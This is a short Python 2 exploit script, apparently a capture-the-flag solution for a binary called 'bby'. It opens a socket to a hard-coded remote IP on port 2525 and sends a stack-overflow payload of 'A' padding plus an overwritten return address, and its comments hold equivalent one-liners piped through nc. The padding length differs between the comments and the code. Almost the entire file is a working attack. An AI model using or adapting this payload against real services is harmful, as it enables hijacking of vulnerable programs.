#!/usr/bin/python

# python -c 'print "A" * 20 + "\x6d\x85\x04\x08"' | nc -vv 146.148.95.248 2525
# python -c 'print "A" * 20 + "\x6d\x85\x04\x08"' | ./bby


import socket
import time

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect(("146.148.95.248", 2525))

p = "A" * 19 + "\x6d\x85\x04\x08"
c.send(p)
time.sleep(1)
r = c.recv(1024)

print r
